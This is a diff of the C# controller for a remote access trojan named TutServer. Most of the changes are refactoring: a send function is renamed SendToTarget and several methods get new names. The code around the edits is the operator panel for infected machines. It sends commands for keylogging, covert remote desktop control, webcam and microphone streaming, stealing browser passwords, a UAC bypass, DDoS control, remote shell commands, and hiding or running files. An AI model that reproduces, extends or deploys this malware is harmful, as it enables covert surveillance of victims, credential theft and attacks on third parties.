         private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             String cmd = "fpaste§" + Current_Path + "§" + xfer_path + "§" + xfer_mode; //Construct the command
-            loopSend(cmd); //Send the command
-            refresh(); //Refresh the file list
+            SendToTarget(cmd); //Send the command
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -4370,8 +4483,8 @@ namespace TutServer //Main Namespace
                     return; //Return
                 }
                 String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory
-                loopSend("fpaste§" + path + "§" + xfer_path + "§" + xfer_mode); //Send the command to the client
-                refresh(); //Refresh the file list
+                SendToTarget("fpaste§" + path + "§" + xfer_path + "§" + xfer_mode); //Send the command to the client
+                RefreshFiles(); //Refresh the file list
             }
         }
 
@@ -4386,7 +4499,7 @@ namespace TutServer //Main Namespace
             {
                 String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the files full path
                 String command = "fexec§" + path; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
             }
         }
 
@@ -4401,7 +4514,7 @@ namespace TutServer //Main Namespace
             {
                 String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                 String command = "fhide§" + path; //Contruct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
             }
         }
 
@@ -4416,7 +4529,7 @@ namespace TutServer //Main Namespace
             {
                 String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                 String command = "fshow§" + path; //Construct the command
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
             }
         }
 
@@ -4431,8 +4544,8 @@ namespace TutServer //Main Namespace
             {
                 String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                 String command = "fdel§" + path; //Construct the command
-                loopSend(command); //Send the command to the client
-                refresh(); //Refresh the file list
+                SendToTarget(command); //Send the command to the client
+                RefreshFiles(); //Refresh the file list
             }
         }
 
@@ -4454,8 +4567,8 @@ namespace TutServer //Main Namespace
                 }
                 if (!validOperation) return; //Return if dialog is cancelled
                 String cmd = "frename§" + path + "§" + newName; //Construct the command
-                loopSend(cmd); //Send the command to the client
-                refresh(); //Refresh the file list
+                SendToTarget(cmd); //Send the command to the client
+                RefreshFiles(); //Refresh the file list
             }
         }
 
@@ -4475,8 +4588,8 @@ namespace TutServer //Main Namespace
             }
             if (!validOperation) return; //If user cancelled the dialog
             String command = "ffile§" + path + "§" + name; //Construct the command
-            loopSend(command); //Send the command to the client
-            refresh(); //Refresh the file list
+            SendToTarget(command); //Send the command to the client
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -4495,8 +4608,8 @@ namespace TutServer //Main Namespace
             }
             if (!validOperation) return; //If the user pressed cancel
             String command = "fndir§" + path + "§" + name; //Construct the command
-            loopSend(command); //Send the command to the client
-            refresh(); //Refresh the file list
+            SendToTarget(command); //Send the command to the client
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -4517,7 +4630,7 @@ namespace TutServer //Main Namespace
                 if (!validOperation) return; //User selected a directory
                 String cmd = "getfile§" + path; //Construct the command
                 edit_content = path; //Store the path of the edited file
-                loopSend(cmd); //Send the command to the client
+                SendToTarget(cmd); //Send the command to the client
             }
         }
 
@@ -4535,8 +4648,7 @@ namespace TutServer //Main Namespace
             dir += "\\" + new FileInfo(file).Name; //Construct the new file path
             String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command
             fup_local_path = file; //Store the local file path for uploading
-            uploadFinished = false; //Set upload finished flag to false
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -4555,8 +4667,7 @@ namespace TutServer //Main Namespace
                 dir += "\\" + new FileInfo(file).Name; //Construct the remote file path
                 String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command
                 fup_local_path = file; //Set the local file path to upload
-                uploadFinished = false; //Set upload finished flag to false
-                loopSend(cmd); //Send the command to the client
+                SendToTarget(cmd); //Send the command to the client
             }
         }
 
@@ -4572,12 +4683,14 @@ namespace TutServer //Main Namespace
                 if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") return; //If user selected a directory return
                 String dir = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                 String cmd = "fdl§" + dir; //Construct the command
-                SaveFileDialog sfd = new SaveFileDialog(); //Create new file saver dialog
-                sfd.FileName = listView3.SelectedItems[0].SubItems[0].Text; //Set the default file name
+                SaveFileDialog sfd = new SaveFileDialog
+                {
+                    FileName = listView3.SelectedItems[0].SubItems[0].Text //Set the default file name
+                }; //Create new file saver dialog
                 if (sfd.ShowDialog() == DialogResult.OK) //If the user pressed save
                 {
                     fdl_location = sfd.FileName; //Store the local location
-                    loopSend(cmd); //Send the command to the client
+                    SendToTarget(cmd); //Send the command to the client
                 }
             }
         }
@@ -4589,7 +4702,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button16_Click(object sender, EventArgs e)
         {
-            loopSend("sklog"); //Send the command to the client
+            SendToTarget("sklog"); //Send the command to the client
         }
 
         /// <summary>
@@ -4599,7 +4712,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button17_Click(object sender, EventArgs e)
         {
-            loopSend("stklog"); //Stop the remote client
+            SendToTarget("stklog"); //Stop the remote client
         }
 
         /// <summary>
@@ -4609,7 +4722,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button18_Click(object sender, EventArgs e)
         {
-            loopSend("rklog"); //Send the command to the client
+            SendToTarget("rklog"); //Send the command to the client
         }
 
         /// <summary>
@@ -4619,7 +4732,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button19_Click(object sender, EventArgs e)
         {
-            loopSend("cklog"); //Send command to client
+            SendToTarget("cklog"); //Send command to client
         }
 
         /// <summary>
@@ -4637,14 +4750,14 @@ namespace TutServer //Main Namespace
 
             if (cmboChooseScreen.SelectedItem != null) //If a screen number is selected
             {
-                loopSend("screenNum" + cmboChooseScreen.SelectedItem.ToString()); //Set the screen on the remote client
+                SendToTarget("screenNum" + cmboChooseScreen.SelectedItem.ToString()); //Set the screen on the remote client
             }
             System.Threading.Thread.Sleep(1500); //Wait for the client
             // _multiRecv = true;
             MultiRecv = true; //Set multiRevc since this is a surveillance module
             RDesktop = true; //Enable the remote desktop flag
             // _rdesktop = true;
-            loopSend("rdstart"); //Send the command to the client
+            SendToTarget("rdstart"); //Send the command to the client
         }
 
         /// <summary>
@@ -4660,7 +4773,7 @@ namespace TutServer //Main Namespace
             btnStartTaskManager.Enabled = false; //Disable task manager opener button
             btnFullScreenMode.Enabled = false; //Disable full screen button
 
-            loopSend("rdstop"); //Send command to the client
+            SendToTarget("rdstop"); //Send command to the client
             Application.DoEvents(); //Do the events
             System.Threading.Thread.Sleep(2000); //Wait for the client to stop
 
@@ -4749,13 +4862,13 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void rmoveTickEventHandler(object sender, EventArgs e)
+        private void RMoveTickEventHandler(object sender, EventArgs e)
         {
             if (rmouse == 1) //If we are allowed to move the mouse
             {
                 if (rMoveCommands.Count > 0) //If we have stored events
                 {
-                    loopSend(rMoveCommands[rMoveCommands.Count - 1]); //Send the last stored event
+                    SendToTarget(rMoveCommands[rMoveCommands.Count - 1]); //Send the last stored event
                     rMoveCommands.Clear(); //Clear the event list
                 }
             }
@@ -4768,15 +4881,17 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void checkBoxrMouse_CheckedChanged(object sender, EventArgs e)
         {
-            sCore.RAT.RemoteDesktop.canControlMouse = checkBoxrMouse.Checked; //Notify the plugins of the event
+            sCore.RAT.RemoteDesktop.SetMouseControl(hostToken, checkBoxrMouse.Checked); //Notify the plugins of the event
 
             if (checkBoxrMouse.Checked) //If enabled
             {
-                rmoveTimer = new Timer(); //Create a new timer
-                // rmoveTimer.Interval = 1000;
-                //Set the update rate to the frame update rate
-                rmoveTimer.Interval = FPS; //now the mouse will move with the frame rate
-                rmoveTimer.Tick += new EventHandler(rmoveTickEventHandler); //Set the tick event handler
+                rmoveTimer = new Timer
+                {
+                    // rmoveTimer.Interval = 1000;
+                    //Set the update rate to the frame update rate
+                    Interval = FPS //now the mouse will move with the frame rate
+                }; //Create a new timer
+                rmoveTimer.Tick += new EventHandler(RMoveTickEventHandler); //Set the tick event handler
                 rmoveTimer.Start(); //Start the timer
                 rmouse = 1; //Allow mouse tracking
             }
@@ -4805,11 +4920,11 @@ namespace TutServer //Main Namespace
             {
                 if (e.Button == MouseButtons.Left) //If left button is clicked
                 {
-                    loopSend("rclick-left-down"); //Send command to client
+                    SendToTarget("rclick-left-down"); //Send command to client
                 }
                 else //Right button is clicked
                 {
-                    loopSend("rclick-right-down"); //Send command to client
+                    SendToTarget("rclick-right-down"); //Send command to client
                 }
             }
         }
@@ -4825,11 +4940,11 @@ namespace TutServer //Main Namespace
             {
                 if (e.Button == MouseButtons.Left) //If left button clicked
                 {
-                    loopSend("rclick-left-up"); //Send command to client
+                    SendToTarget("rclick-left-up"); //Send command to client
                 }
                 else //If right button clicked
                 {
-                    loopSend("rclick-right-up"); //Send command to client
+                    SendToTarget("rclick-right-up"); //Send command to client
                 }
             }
         }
@@ -4841,7 +4956,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void checkBoxrKeyboard_CheckedChanged(object sender, EventArgs e)
         {
-            sCore.RAT.RemoteDesktop.canControlKeyboard = checkBoxrKeyboard.Checked; //Notify plugins of the event
+            sCore.RAT.RemoteDesktop.SetKeyboardControl(hostToken, checkBoxrKeyboard.Checked); //Notify plugins of the event
 
             txtBControlKeyboard.Focus(); //Focus the textbox control
 
@@ -4874,7 +4989,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button24_Click(object sender, EventArgs e)
         {
-            loopSend("alist"); //Send the command to the client
+            SendToTarget("alist"); //Send the command to the client
         }
 
         /// <summary>
@@ -4891,16 +5006,16 @@ namespace TutServer //Main Namespace
                     int deviceNumber = listView4.SelectedItems[0].Index; //Get the channel of the device
                     MultiRecv = true; //Set the multiRecv flag since audio stream is a surveillance module
                     AuStream = true; //Set the audio stream flag
-                    astream = new audioStream(); //Create a new playback object
-                    astream.init(); //Init the playback object
-                    loopSend("astream§" + deviceNumber.ToString()); //Send the command to the client
+                    astream = new AudioStream(); //Create a new playback object
+                    astream.Init(); //Init the playback object
+                    SendToTarget("astream§" + deviceNumber.ToString()); //Send the command to the client
                     button25.Text = "Stop Stream"; //Update UI
                     return; //Return
                 }
 
                 if (AuStream) //If audio stream is running
                 {
-                    loopSend("astop"); //Send command to client
+                    SendToTarget("astop"); //Send command to client
                     if (!RDesktop && !WStream) //If no remote desktop or web cam stream is running
                     {
                         Application.DoEvents(); //Do the events
@@ -4908,7 +5023,7 @@ namespace TutServer //Main Namespace
                         MultiRecv = false; //Set multiRecv to false since no surveillance stream is running
                     }
                     AuStream = false; //Disable the audioStream flag
-                    astream.destroy(); //Destroy the playback object
+                    astream.Destroy(); //Destroy the playback object
                     astream = null; //Remvove references to the playback object
                     button25.Text = "Start Stream"; //Update the UI
                 }
@@ -4922,7 +5037,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button26_Click(object sender, EventArgs e)
         {
-            loopSend("wlist"); //Send the command to the client
+            SendToTarget("wlist"); //Send the command to the client
         }
 
         /// <summary>
@@ -4939,13 +5054,13 @@ namespace TutServer //Main Namespace
                 MultiRecv = true; //Set the multiRecv flag since web cam is a surveillance stream
                 WStream = true; //Set the web cam stream flag
                 button27.Text = "Stop stream"; //Update the UI
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 return; //Return
             }
 
             if (WStream) //If web cam is streaming
             {
-                loopSend("wstop"); //Send the command to the client
+                SendToTarget("wstop"); //Send the command to the client
 
                 if (!RDesktop && !AuStream) //If remote desktop and audio stream isn't running
                 {
@@ -5000,7 +5115,7 @@ namespace TutServer //Main Namespace
             int count = 0; //Declare index variable
             foreach (Socket s in _clientSockets) //Go through all connected clients
             {
-                sendCommand(command, count); //Send the command to the client
+                SendCommand(command, count); //Send the command to the client
                 count++; //Increment the index
             }
             label18.Text = "Status: DDoS Stopped for all clients!"; //Update the UI
@@ -5023,7 +5138,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button31_Click(object sender, EventArgs e)
         {
-            loopSend("getpw"); //Get browser passwords on the remote client
+            SendToTarget("getpw"); //Get browser passwords on the remote client
         }
 
         /// <summary>
@@ -5040,22 +5155,22 @@ namespace TutServer //Main Namespace
             if (value < 25)
             {
                 lblQualityShow.Text += "(low)";
-                loopSend("fpslow");
+                SendToTarget("fpslow");
             }
             else if (value >= 75 && value <= 85)
             {
                 lblQualityShow.Text += "(best)";
-                loopSend("fpsbest");
+                SendToTarget("fpsbest");
             }
             else if (value >= 85)
             {
                 lblQualityShow.Text += "(high)";
-                loopSend("fpshigh");
+                SendToTarget("fpshigh");
             }
             else if (value >= 25)
             {
                 lblQualityShow.Text += "(mid)";
-                loopSend("fpsmid");
+                SendToTarget("fpsmid");
             }
 
 
@@ -5240,7 +5355,7 @@ namespace TutServer //Main Namespace
                 // parent.loopSend("rtype-" + keysToSend);
 
                 //Send the command to the remote client
-                loopSend("rtype-" + keysToSend);
+                SendToTarget("rtype-" + keysToSend);
 
             }
             txtBControlKeyboard.Clear(); //Clear the control
@@ -5253,7 +5368,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void btnStartTaskManager_Click(object sender, EventArgs e)
         {
-            loopSend("tskmgr"); //Send the command to the client
+            SendToTarget("tskmgr"); //Send the command to the client
         }
 
         /// <summary>
@@ -5264,7 +5379,7 @@ namespace TutServer //Main Namespace
         private void btnCountScreens_Click(object sender, EventArgs e)
         {
             cmboChooseScreen.Items.Clear(); //Clear the current items
-            loopSend("countScreens"); //Send the command to the client
+            SendToTarget("countScreens"); //Send the command to the client
         }
 
         /// <summary>
@@ -5303,7 +5418,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button33_Click(object sender, EventArgs e)
         {
-            loopSend("uacbypass"); //Send the command to the client
+            SendToTarget("uacbypass"); //Send the command to the client
         }
 
         /// <summary>
@@ -5314,9 +5429,9 @@ namespace TutServer //Main Namespace
         private void button34_Click(object sender, EventArgs e)
         {
             string cmd = "startipc§tut_client_proxy"; //Construct the command
-            remotePipe rp = new remotePipe("tut_client_proxy", this); //Create a new remote pipe
-            loopSend(cmd); //Send the command oto the client
-            sCore.RAT.ExternalApps.ipcConnections.Add("tut_client_proxy", rp.outputBox); //Broadcast the IPC connection to the plugins
+            RemotePipe rp = new RemotePipe("tut_client_proxy", this); //Create a new remote pipe
+            SendToTarget(cmd); //Send the command oto the client
+            sCore.RAT.ExternalApps.AddIPCConnection(hostToken, new KeyValuePair<string, RichTextBox>("tut_client_proxy", rp.outputBox)); //Broadcast the IPC connection to the plugins
             rp.Show(); //Start the remote pipe
             rPipeList.Add(rp); //Add the pipe to the list
         }
@@ -5381,6 +5496,11 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button38_Click(object sender, EventArgs e)
         {
+            if (sh.runningPlugins.Count > 0)
+            {
+                MessageBox.Show(this, "There are running plugins, you can't currently refresh the plugin list", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
             listBox1.Items.Clear(); //Clear the plugin list
             sh.LoadDllFiles(); //Reload the plugin files
 
@@ -5422,9 +5542,11 @@ namespace TutServer //Main Namespace
         private void button35_Click(object sender, EventArgs e)
         {
             //Should implement this in ScriptHost
-            OpenFileDialog ofd = new OpenFileDialog(); //Display a file chooser dialog
-            ofd.Title = "Please Select A Valid Dll Pluing File"; //Set the title of the dialog
-            ofd.DefaultExt = "Plugin Files (*.dll)|*.dll"; //Set the file extension filter to dll files
+            OpenFileDialog ofd = new OpenFileDialog
+            {
+                Title = "Please Select A Valid Dll Pluing File", //Set the title of the dialog
+                DefaultExt = "Plugin Files (*.dll)|*.dll" //Set the file extension filter to dll files
+            }; //Display a file chooser dialog
             if (ofd.ShowDialog() == DialogResult.OK) //If the user selected the file
             {
                 if (File.Exists(ofd.FileName)) //If the selected file exists
@@ -5446,7 +5568,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button20_Click(object sender, EventArgs e)
         {
-            loopSend("uacload"); //Send the command to the client
+            SendToTarget("uacload"); //Send the command to the client
             progressBar1.Show(); //Show the progressbar
             label36.Show(); //Show the status label
             label36.Text = "0%"; //Set the label to 0%
@@ -5461,11 +5583,32 @@ namespace TutServer //Main Namespace
         {
             if (comboBox7.SelectedItem == null) //If a no method selected
             {
-                msgbox("Error!", "No probing method selected!\r\nPlease select one!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
+                Msgbox("Error!", "No probing method selected!\r\nPlease select one!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                 return; //Return
             }
 
-            loopSend("sprobe§" + comboBox7.SelectedItem); //Send the command to the client
+            SendToTarget("sprobe§" + comboBox7.SelectedItem); //Send the command to the client
+        }
+
+        /// <summary>
+        /// Stop a plugin from running
+        /// </summary>
+        /// <param name="sender">The sender of the event</param>
+        /// <param name="e">The event args</param>
+        private void button39_Click(object sender, EventArgs e)
+        {
+            if (listBox1.SelectedItem == null) //Check if nothing is selected
+            {
+                MessageBox.Show(this, "Please select a plugin to stop", "Stop Plugin", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
+                return; //Return
+            }
+
+            string plugin = listBox1.SelectedItem.ToString(); //Get the name of the plugin
+            if (sh.IsPluginRunning(plugin)) //Check if the plugin is running
+            {
+                sh.StopSignalPlugin(sh.ifaceList[plugin]); //Send stop signal to the plugin
+                MessageBox.Show(this, "Stop signal sent to plugin, it will finish up and close it's threads... This may take a while", "Plugin Stop", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
+            }
         }
 
         #endregion
@@ -5476,7 +5619,7 @@ namespace TutServer //Main Namespace
     /// <summary>
     /// Audio playback class
     /// </summary>
-    public class audioStream
+    public class AudioStream
     {
         /// <summary>
         /// Audio Stream provider
@@ -5490,7 +5633,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Init audio stream playing
         /// </summary>
-        public void init()
+        public void Init()
         {
             provider = new NAudio.Wave.BufferedWaveProvider(new NAudio.Wave.WaveFormat()); //Setup the provider
             waveOut = new NAudio.Wave.WaveOut(); //Setup the player
@@ -5502,7 +5645,7 @@ namespace TutServer //Main Namespace
         /// Send audio to the playback device
         /// </summary>
         /// <param name="recv">The audio buffer to play</param>
-        public void bufferPlay(byte[] recv)
+        public void BufferPlay(byte[] recv)
         {
             provider.AddSamples(recv, 0, recv.Length); //Feed the buffer to the provider
             recv = null; //Remove references to the buffer
@@ -5511,7 +5654,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Release audio playing object
         /// </summary>
-        public void destroy()
+        public void Destroy()
         {
             waveOut.Stop(); //Stop playing the audio
             provider.ClearBuffer(); //Clear the audio buffer
@@ -5524,7 +5667,7 @@ namespace TutServer //Main Namespace
     /// <summary>
     /// Provides functionality to use tabpages as small forms
     /// </summary>
-    public class routeWindow
+    public class RouteWindow
     {
         /// <summary>
         /// The page we will route
@@ -5543,24 +5686,26 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Copy tab page to a form
         /// </summary>
-        public void routePage()
+        public void RoutePage()
         {
             if (page == null) return; //If no page routed return
 
             Control.ControlCollection controls = page.Controls; //Get the page controls
-            Form route = new Form(); //Create the new routed form
-            route.Size = page.Parent.Size; //Get the size of the form
-            route.Text = "RouteWindow[" + (TutServer.Form1.routeWindow.Count + 1).ToString() + "] " + page.Text; //Set the form title
-            route.WindowState = FormWindowState.Normal; //Set the form window state
-            route.FormBorderStyle = FormBorderStyle.FixedToolWindow; //Set the form's border style
-            route.BackColor = SystemColors.Window; //Set the form's background color
+            Form route = new Form
+            {
+                Size = page.Parent.Size, //Get the size of the form
+                Text = "RouteWindow[" + (Form1.routeWindow.Count + 1).ToString() + "] " + page.Text, //Set the form title
+                WindowState = FormWindowState.Normal, //Set the form window state
+                FormBorderStyle = FormBorderStyle.FixedToolWindow, //Set the form's border style
+                BackColor = SystemColors.Window //Set the form's background color
+            }; //Create the new routed form
             String assignContextMenu = "";
             ContextMenuStrip cloneCMS = new ContextMenuStrip();
 
             foreach (Control c in controls) //Loop through the controls
             {
                 String name = c.Name; //Get the name of the control
-                String type = getControlType(name); //Get the type of the control
+                String type = GetControlType(name); //Get the type of the control
                 Control add;
                 if (type == "") continue; //If invalid type found, then skip it
                 switch (type) //Switch type
@@ -5594,7 +5739,7 @@ namespace TutServer //Main Namespace
                         b.BackColor = bref.BackColor; //Set the background color
                         b.ForeColor = bref.ForeColor; //Set the text color
                         b.UseVisualStyleBackColor = bref.UseVisualStyleBackColor; //Set the visual style background color property
-                        b.Click += new EventHandler(onClick); //Add the click event handler
+                        b.Click += new EventHandler(OnClick); //Add the click event handler
                         b.Name = bref.Name; //Set the name
 
                         route.Controls.Add(b); //Add the button to the form
@@ -5619,7 +5764,7 @@ namespace TutServer //Main Namespace
                         cb.BackColor = cref.BackColor; //Set the background color
                         cb.SelectedIndex = cref.SelectedIndex; //Set the selected item's index
                         cb.Font = cref.Font; //Set the font settings
-                        cb.SelectedValueChanged += new EventHandler(onItemChange); //Add a value changed event handler
+                        cb.SelectedValueChanged += new EventHandler(OnItemChange); //Add a value changed event handler
 
                         route.Controls.Add(cb); //Add the combobox to the form
 
@@ -5638,7 +5783,7 @@ namespace TutServer //Main Namespace
                         rtb.Size = rref.Size; //Set the size
                         rtb.WordWrap = rref.WordWrap; //Set the word wrap property
                         rtb.Font = rref.Font; //Set the font settings
-                        rtb.TextChanged += new EventHandler(onTextChange); //Add a text changed event handler
+                        rtb.TextChanged += new EventHandler(OnTextChange); //Add a text changed event handler
 
                         route.Controls.Add(rtb); //Add the richTextBox to the form
 
@@ -5655,8 +5800,8 @@ namespace TutServer //Main Namespace
                         t.ForeColor = tref.ForeColor; //Set the textColor
                         t.Location = tref.Location; //Set the location
                         t.Size = tref.Size; //Set the size
-                        t.TextChanged += new EventHandler(onTextChange); //Add a text changed event handler
-                        t.KeyDown += new KeyEventHandler(onKeyDown); //Add a key down event handler
+                        t.TextChanged += new EventHandler(OnTextChange); //Add a text changed event handler
+                        t.KeyDown += new KeyEventHandler(OnKeyDown); //Add a key down event handler
                         t.Font = tref.Font; //Set the font settings
                         t.UseSystemPasswordChar = tref.UseSystemPasswordChar; //Set the use of password character
                         t.PasswordChar = tref.PasswordChar; //Set the password character
@@ -5687,38 +5832,44 @@ namespace TutServer //Main Namespace
 
                         foreach (ColumnHeader ch in lref.Columns) //Go through the columns
                         {
-                            ColumnHeader header = new ColumnHeader(); //Create a new column header
-                            header.DisplayIndex = ch.DisplayIndex; //Set the display index
-                            header.Name = ch.Name; //Set the name
-                            header.Text = ch.Text; //Set the text
-                            header.Width = ch.Width; //Set the width
+                            ColumnHeader header = new ColumnHeader
+                            {
+                                DisplayIndex = ch.DisplayIndex, //Set the display index
+                                Name = ch.Name, //Set the name
+                                Text = ch.Text, //Set the text
+                                Width = ch.Width //Set the width
+                            }; //Create a new column header
 
                             lv.Columns.Add(header); //Add the column to the new listView
                         }
                         foreach (ListViewItem i in lref.Items) //Go through the items
                         {
-                            ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                            lvi.BackColor = i.BackColor; //Set the background color
-                            lvi.Focused = i.Focused; //Set the focused state
-                            lvi.Font = i.Font; //Set the font settings
-                            lvi.ForeColor = i.ForeColor; //Set the text color
-                            lvi.Name = i.Name; //Set the name
-                            lvi.Text = i.Text; //Set the text
-                            lvi.Selected = i.Selected; //Set if the item is selected
+                            ListViewItem lvi = new ListViewItem
+                            {
+                                BackColor = i.BackColor, //Set the background color
+                                Focused = i.Focused, //Set the focused state
+                                Font = i.Font, //Set the font settings
+                                ForeColor = i.ForeColor, //Set the text color
+                                Name = i.Name, //Set the name
+                                Text = i.Text, //Set the text
+                                Selected = i.Selected //Set if the item is selected
+                            }; //Create a new listView item
                             foreach (ListViewItem.ListViewSubItem si in i.SubItems) //Go through the subitems
                             {
-                                ListViewItem.ListViewSubItem sitem = new ListViewItem.ListViewSubItem(); //Create a new subitem
-                                sitem.BackColor = si.BackColor; //Set the background color
-                                sitem.Font = si.Font; //Set the font settings
-                                sitem.ForeColor = si.ForeColor; //Set the text color
-                                sitem.Name = si.Name; //Set the name
-                                sitem.Text = si.Text; //Set the text
+                                ListViewItem.ListViewSubItem sitem = new ListViewItem.ListViewSubItem
+                                {
+                                    BackColor = si.BackColor, //Set the background color
+                                    Font = si.Font, //Set the font settings
+                                    ForeColor = si.ForeColor, //Set the text color
+                                    Name = si.Name, //Set the name
+                                    Text = si.Text //Set the text
+                                }; //Create a new subitem
                                 lvi.SubItems.Add(sitem); //Add the subitem to the current item
                             }
                             lv.Items.Add(lvi); //Add the current item to the listView
                         }
 
-                        lv.SelectedIndexChanged += new EventHandler(onIndexChange); //Add the selected index changed event handler
+                        lv.SelectedIndexChanged += new EventHandler(OnIndexChange); //Add the selected index changed event handler
                         lv.Font = lref.Font; //Set the font settings
 
                         route.Controls.Add(lv); //Add the listView to the form
@@ -5739,7 +5890,7 @@ namespace TutServer //Main Namespace
                         cx.AutoSize = xref.AutoSize; //Set the autoSize property
                         cx.Size = xref.Size; //Set the size
                         cx.Font = xref.Font; //Set the font settings
-                        cx.CheckedChanged += new EventHandler(onCheck); //Add a checked changed event handler
+                        cx.CheckedChanged += new EventHandler(OnCheck); //Add a checked changed event handler
 
                         route.Controls.Add(cx); //Add the checkBox to the form
 
@@ -5768,23 +5919,25 @@ namespace TutServer //Main Namespace
             //Controls are added at this Point
 
             route.Show(); //Show the newly created form
-            route.FormClosing += new FormClosingEventHandler(onRouteDestroy); //Assign a closing event handler
-            TutServer.Form1.routeWindow.Add(route); //Add the window to the list
+            route.FormClosing += new FormClosingEventHandler(OnRouteDestroy); //Assign a closing event handler
+            Form1.routeWindow.Add(route); //Add the window to the list
             if (assignContextMenu != "") //If we need to assign a context menu
             {
                 Control acms = route.Controls.Find(assignContextMenu, false)[0]; //Find the parent listView of the contextMenu
-                ContextMenuStrip copyCMS = new ContextMenuStrip(); //Create a new context menu strip
-                copyCMS.AutoSize = cloneCMS.AutoSize; //Set the autoSize property
-                copyCMS.Font = cloneCMS.Font; //Set the font settings
-                copyCMS.BackColor = cloneCMS.BackColor; //Set the backgroung color
-                copyCMS.ForeColor = cloneCMS.ForeColor; //Set the text color
-                copyCMS.Name = cloneCMS.Name; //Set the name
-                copyCMS.Size = cloneCMS.Size; //Set the size
-                copyCMS.Text = cloneCMS.Text; //Set the text
+                ContextMenuStrip copyCMS = new ContextMenuStrip
+                {
+                    AutoSize = cloneCMS.AutoSize, //Set the autoSize property
+                    Font = cloneCMS.Font, //Set the font settings
+                    BackColor = cloneCMS.BackColor, //Set the backgroung color
+                    ForeColor = cloneCMS.ForeColor, //Set the text color
+                    Name = cloneCMS.Name, //Set the name
+                    Size = cloneCMS.Size, //Set the size
+                    Text = cloneCMS.Text //Set the text
+                }; //Create a new context menu strip
 
                 foreach (ToolStripItem i in cloneCMS.Items) //Go through the toolStripItems
                 {
-                    copyCMS.Items.Add(i.Text, i.Image, onClick); //Add the items to the new CMS
+                    copyCMS.Items.Add(i.Text, i.Image, OnClick); //Add the items to the new CMS
                 }
                 int track = 0; //Declare index variable
                 foreach (ToolStripItem i in copyCMS.Items) //Go through the items
@@ -5798,9 +5951,11 @@ namespace TutServer //Main Namespace
                 acms.ContextMenuStrip = copyCMS; //Set the CMS of the listView
             }
 
-            Timer update = new Timer(); //Create a new timer object
-            update.Interval = 100; //Set the frequency to 100 ms
-            update.Tick += new EventHandler(updateUI); //Set the tick event handler
+            Timer update = new Timer
+            {
+                Interval = 100 //Set the frequency to 100 ms
+            }; //Create a new timer object
+            update.Tick += new EventHandler(UpdateUI); //Set the tick event handler
             currentRoute = route; //Set a self reference
             update.Start(); //Start the timer
         }
@@ -5810,7 +5965,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onKeyDown(object sender, KeyEventArgs e)
+        private void OnKeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Return && Form1.IsCmdStarted) //If eneter is pressed and remote cmd is started
             {
@@ -5820,7 +5975,7 @@ namespace TutServer //Main Namespace
                     String command = "cmd§" + me.Text; //Construct the command
                     me.Text = ""; //Clear the text
                     Form1 f = new Form1(); //Create a new instance of the form
-                    f.loopSend(command); //Send the command
+                    f.SendToTarget(command); //Send the command
                 }
             }
             else if (e.KeyCode == Keys.Return && !Form1.IsCmdStarted) //If eneter is pressed and cmd isn't started
@@ -5835,7 +5990,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onRouteDestroy(object sender, FormClosingEventArgs e)
+        private void OnRouteDestroy(object sender, FormClosingEventArgs e)
         {
             Form dieRoute = (Form)sender; //Get our form
             String dieRouteID = dieRoute.Text.Split('[')[1].Substring(0, 1); //Get the route ID
@@ -5870,7 +6025,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void onItemChange(object sender, EventArgs e)
+        private void OnItemChange(object sender, EventArgs e)
